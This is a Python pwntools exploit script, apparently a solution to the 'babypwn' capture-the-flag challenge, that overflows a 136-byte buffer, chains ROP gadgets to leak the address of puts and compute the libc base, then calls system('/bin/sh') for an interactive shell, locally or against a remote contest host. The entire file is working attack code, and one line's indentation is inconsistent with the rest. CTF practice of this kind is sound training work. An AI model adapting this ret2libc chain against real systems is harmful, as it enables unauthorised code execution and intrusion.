#!/usr/bin/python

from pwn import *

LOCAL = True

def pwn():


	copy =  0x401146
	bin_sh = 0x40302d
	pop_rdi = 0x401203
	puts_plt  = 0x401030
	puts_got = 0x403fc8

	rop1 =  p64(pop_rdi)
	rop1 += p64(puts_got)
	rop1 += p64(puts_plt)

	log.info("babypwn - pwnuniversity - mphx2\n\n")
	target.recvuntil("Welcome student! Can you run /bin/sh\n")
	target.sendline("A"*136+rop1+p64(copy))
  puts_libc =  target.recvuntil("\n")
	libc_base = u64(puts_libc[0:6]+"\x00\x00") - 0x809c0

	system = libc_base + 0x4f440 + 27
#	system = libc_base + 0x45380 + 27

	log.success("libc base    addr: %#x", libc_base)
	log.success("system()     addr: %#x", system)

	rop2 =  p64(pop_rdi)
	rop2 += p64(bin_sh)
	rop2 += p64(system)

	target.sendline("A"*136+rop2)

	target.interactive()

def main():
        global target
        if LOCAL:
                target = process("./babypwn")

        else:
                target = remote("baby.uni.hctf.fun", 25251)
        pwn()

if __name__ == "__main__":
    main()
